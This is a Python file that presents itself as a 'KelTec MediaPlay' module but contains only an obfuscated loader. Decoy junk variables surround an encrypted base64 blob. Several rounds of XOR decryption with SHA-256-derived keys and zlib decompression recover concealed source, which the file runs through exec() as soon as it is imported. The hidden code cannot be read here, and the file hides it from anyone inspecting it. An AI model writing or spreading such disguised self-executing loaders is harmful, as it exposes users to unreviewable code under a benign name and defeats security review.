# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 537595 ^ 877338
_lx1_1 = len("a53d15")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-974611)
_lx3_3 = 436455 * 0
_lx4_4 = 118473 ^ 576765
_K = 'd29a8f6cef6f26fcd6d2d6295799730b055ee133e5ed226edd4b357b934703fd'
_M = 'WXL3Od3qvLB2zA=='
_D = '=sbwJojNWiHOTNtTt0hT83X4WuNxNirS2gXGO7f5xw6U9L7Jy9c5k9Tu7K0jYpBa2MdBsUxaMvZpE05LjTF8PCwkJYkd/N7PXWk2KA/KXw6w8Adkhhs/otxI0V6gzBQKVzF0C3PLu3VSO+p87chSqQlZit+J77Fcfn+g9GifJ5NHLcwwKkv7NjrjZ0hKxOjkm8GBr+VRSFJtv/KrFI5Ly7qyrOh15GKl/cWm9ao8sGPEKjfVIgKNfKUt1FtX6TplpnEQknluwOXx8CcYVeAgIvOnccWYJExJc3QeAvlFKlsZ6jwc6hHi8Wq3V78/XGRpjhaKZrjufdlTmffZLSJ/Zmc46yyDD625+BclZ250Pid+nOcBQmplJOGdQIdXyvx2s/xV1prMTSXov3qqsMT8PvTeM6reg6A8rAGyv14YrHur9wGnjm+SeurB6JiuqrOMXwhix+wBYJqHhGgXZ+Km1meSs7dYVC9e/2Vnjy3BIdMZKURlkdwuQtzGD1KLpdLWSzv4ti5BfN5FkNayVwiSQuGZDbLVOqXhCpb+px9Qr27xkzXfxayqtGSJxWRGjD1M06q0AKNlNLwUEFY4A3ib1x1gs4xrTLlKv8sKTZvoo0I5DUZEXFXlshwXOGc9299Q/nlOc5fd1wYNwyFDMP1lVXfCGHD+6CI4uznS12zHwEWGzrQlxwrEqIVqwjP+gU/gFtvK/+A+nrWGlyQVgXKhqAf2zI4DVtLw+DP6/rpwJO/jeay8cicDC63rhIgIaTrm0CpEmaLtWc/VZBXCZyj0jIkCKTA7EVXd1OyGWCg2w8xlXRWgn0mNauUq/9QwW4djk3n+RULztEkZlo4XgCn1Ck1oo92GAhTBEv9CV1bmK6ht26dq/INGoHOrQdp5e86UP13D4hJVuphb/LXhV0rY7qnKS3vxLCw+C0B+iXL0bZuhh058hVhYY106qIPwpny3BKyB7W4lb+aWdMwy9izvkpIsS83i/HoX0m4loKuoXadRo9VHAOwz65cxs6VC8rkDsW/zqZ3yg9Nm9UOYlcIbiWUGNP4VPC4n079//DwGgJZg5iNRYesBhhcfFzDSzwK2lCIPMbhz2CuW+QOff5wcpUi8LtSxRXLLeWaXjFYJUd3Vzo31sUUSGcSFxxY+23N9oi8Eb3zSUxf4pGy06lZTc5GlHQr/hDf9sAlR2SyCo3GDGDTIEborNtbprsNVL0ivYgsf7xsh0hDYBwk16jyBxlAC5VEr292jU9wZuMBdRyl9+mTfXiPE5KML6J+XZZqBEbPy+pYUD7Gm/gNFKPyHYMuvtgxRAH1kFTvN56uVl/ZJh1twMVm5DZKdDdPBOr04FpdhmupZnZvKs0vojeN6nwJr07my7buBifilUxloWbJIhqihcpC1u17fnYpTRZCSwXSSWiOe0QYabP/rqDYIHDZUMverN3IFy86lNZdF8mr5helKxDlygc+zSTVO+rFhG8vVfiXrjfcjQbm9zafR19LkM8Q+sRx+0ob6dP13VE4BiyxonbyJwF5fVVUjSEraGfmUQdBRHBCANbOCSG4ENrsX3c5JqzHJzpEjhVVx/1U6xBLoAMh2j9Iwhsu66NdSJA9obP/bDGsot23DQtixUDU+ucSWOEHtbWs8xeF7is2OvOExydeMDK5q8tzpdMFS9MKgdgwRuBw8h6JuG+ljw5pToaxHBMvil8Vt0TYkRzL0SdQHuQfW3dl3sDxAvzN9lkMXl2EZWsBHFv59TEdD9uX8UM+5mg6+YYo47X/6JGVgCqrFjBZxVkuG3hmO33OWRykc/mfu6nGCbLC7bAEOQJcI43zqHTtAKSxy9T+ZutbYNIqFLW7E'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})
